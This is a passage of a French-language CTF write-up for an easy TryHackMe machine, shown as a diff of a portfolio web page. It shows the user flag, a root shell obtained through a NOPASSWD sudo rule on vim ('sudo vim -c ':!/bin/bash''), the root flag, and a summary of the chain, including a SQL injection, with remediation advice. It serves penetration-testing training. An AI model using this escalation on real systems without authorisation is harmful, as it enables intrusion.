+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch@Machine:~$ cat user.txt </span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">G00d j0b, keep up!</span>
+</code></pre></div>
+<p>🚩User Flag: <code>G00d j0b, keep up!</code></p>
+<p>Découvrons les autres utilisateurs du système</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch@Machine:~$ ls /home</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch  sunbath</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch@Machine:~$ </span>
+</code></pre></div>
+<p>Il y a donc un autre utilisateur nommé <code>sunbath</code>. </p>
+<h2 id="phase6-escalade-de-privilege">Phase6:  Escalade de privilège</h2>
+<p>Vérifions nos droits</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch@Machine:~$ sudo -l</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">User mitch may run the following commands on Machine:</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">    (root) NOPASSWD: /usr/bin/vim</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch@Machine:~$ </span>
+</code></pre></div>
+<p>On peut donc utiliser <code>vim</code> en tant que root sans avoir à fournir de mot de passes. Or vim nous permet d’exécuter des commandes système via </p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">vim -c ':!commande'</span>
+</code></pre></div>
+<p>Nous pouvons donc lancer un shell en tant que root</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sudo vim -c ':!/bin/bash'</span>
+</code></pre></div>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch@Machine:~$ sudo vim -c ':!/bin/bash'</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@Machine:~# whoami</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@Machine:~# id</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@Machine:~# </span>
+</code></pre></div>
+<p>Nous pouvons alors récupérer le flag root</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@Machine:~# ls -la /root</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">total 28</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwx------  4 root root 4096 Feb 27 16:45 .</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwxr-xr-x 23 root root 4096 Aug 19  2019 ..</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwx------  2 root root 4096 Aug 17  2019 .cache</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwxr-xr-x  2 root root 4096 Aug 17  2019 .nano</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rw-r--r--  1 root root   24 Aug 17  2019 root.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@Machine:~# cat /root/root.txt </span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">W3ll d0n3. You made it!</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@Machine:~# </span>
+</code></pre></div>
+<p>🚩Flag root : <code>W3ll d0n3. You made it!</code></p>
+<h2 id="resume">Résumé</h2>
+<p>Ce CTF, accessible aux débutants, m'a permis d'apprendre plusieurs concepts fondamentaux des tests d'intrusion :</p>
+<h3 id="chaine-dattaque">Chaîne d'attaque</h3>
+<ol>
+<li><strong>Énumération du réseau</strong> → Découverte des services FTP, HTTP et SSH</li>
+<li><strong>Accès FTP anonyme</strong> → Découverte d'une note suggérant des identifiants faibles</li>
+<li><strong>Énumération Web</strong> → Découverte de l'installation de CMS Made Simple</li>
+<li><strong>Injection SQL</strong> → Exploitation de la vulnérabilité CVE-2019-9053 pour extraire des identifiants</li>
+<li><strong>Élévation de privilèges</strong> → Exploitation d'une configuration incorrecte des permissions sudo sur vim</li>
+</ol>
+<h3 id="recommandations-correctives">Recommandations correctives</h3>
+<ul>
+<li>Injection SQL : Toujours utiliser des requêtes paramétrées et maintenez le CMS à jour.</li>
+<li>Politique de mots de passe : Exigez des mots de passe robustes.</li>
+<li>Configuration sudo : Soyez extrêmement prudent lorsque vous accordez les privilèges NOPASSWD, en particulier pour les éditeurs comme vim qui peuvent exécuter des commandes shell.</li>
+<li>Principe du moindre privilège : Les utilisateurs ne doivent disposer que des permissions minimales nécessaires.</li>
+</ul>
+
+      <div style="margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+        <a href="../writeups" class="btn btn-outline">← Tous les writeups</a>
+      </div>
+    </article>
+
+    <aside class="writeup-sidebar" style="position: sticky; top: 100px;">
+      <div class="sidebar-title">Table des matières</div>
+      <div class="toc-list" style="max-height: calc(100vh - 150px); overflow-y: auto;">
+        <a href="#objectif" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Objectif</a>
+<a href="#techniques-utilisees" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Techniques utilisées</a>
+<a href="#reconaissance" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Reconaissance</a>
+<a href="#phase1-enumeration-ftp" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; margin-left: 1rem;">Phase1: Enumération FTP</a>
+<a href="#phase-2-brute-force-des-repertoires" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Phase 2: Brute force des répertoires</a>
+<a href="#phase-3-cms-simple-exploration" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Phase 3: CMS Simple Exploration</a>
+<a href="#phase4-acces-ssh" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Phase4 : Accès SSH</a>
+<a href="#phase5-obtention-du-user-flag" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Phase5: Obtention du User Flag</a>
+<a href="#phase6-escalade-de-privilege" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Phase6:  Escalade de privilège</a>
+<a href="#resume" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Résumé</a>
+<a href="#chaine-dattaque" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; margin-left: 1rem;">Chaîne d'attaque</a>
+<a href="#recommandations-correctives" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; margin-left: 1rem;">Recommandations correctives</a>
+
+      </div>
+      <hr style="border-color:var(--border);margin:1.5rem 0;"/>
+      <div style="display:flex;flex-direction:column;gap:0.6rem;font-size:0.85rem;font-family:var(--font-mono);">
+        <div><span style="color:var(--text-muted);">Plateforme :</span> <span style="color:var(--green);">TryHackMe</span></div>
+        <div><span style="color:var(--text-muted);">Difficulté :</span> <span><span class="diff diff-easy">Easy</span></span></div>
+        <div><span style="color:var(--text-muted);">Date :</span> <span style="color:var(--text-secondary);">2026-02-27</span></div>
+      </div>
+    </aside>
+  </div>
+</div>
+</section>
+</main>
+
+<footer><div class="container"><div class="footer-inner">
+  <div class="footer-name">&gt;_ alex171-studo</div>
+  <div class="footer-links"><a href="../writeups">Writeups</a><a href="../index">Accueil</a></div>
+  <div class="footer-copy">© 2026 Alex171-studo</div>
+</div></div></footer>
+
+<div id="interactive-terminal" class="terminal-window">
+  <div class="terminal-titlebar">
+    <div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div>
+    <span class="terminal-title">Terminal interactif</span>
+    <button id="term-close" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+  </div>
+  <div class="term-interactive-body" id="term-output"></div>
+  <div class="term-input-line">
+    <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;color:var(--green)">alex@portfolio:~$</span>
+    <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off" spellcheck="false"/>
+  </div>
+</div>
+<button class="term-toggle-btn" id="term-toggle">&gt;_</button>
+<script src="../js/main.js"></script>
+<script src="../js/terminal.js"></script>
 </body>
-
 </html>
